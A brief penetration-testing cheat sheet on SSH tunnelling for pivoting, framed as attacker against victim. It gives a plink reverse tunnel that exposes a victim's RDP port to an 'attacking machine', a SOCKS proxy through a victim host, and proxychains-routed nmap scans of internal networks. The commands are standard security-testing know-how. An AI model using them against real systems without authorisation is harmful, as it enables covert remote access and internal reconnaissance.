## SSH Tunnels

### Reverse SSH Tunnel

*From the victim machine to our attacking box.*

```bash
plink -l root -pw <mypassword> <attacking.machine.ip.address> -R 3390:127.0.0.1:3389
```

### SSH Dynamic Port Forwarding

* Set a local listening port and have it tunnel incoming traffic to any remote destination through a socks proxy.
* SSH to create a socks4 proxy on our local attacking box and tunnel all incoming traffic to that port through DMZ network of our victim.
* Forward/Tunnel and redirect our traffic to the victim's machine.

```bash
ssh -D 8181 root@victim.example.com
```

* proxychains

```bash
nano /etc/proxychains.conf
```

* Content

```bash
[ProxyList]
#...
socks4 127.0.0.1 8181
```

* Run e.g. nmap

```bash
proxychains nmap -p 80 -sT -Pn x.x.x.0/24 --open
```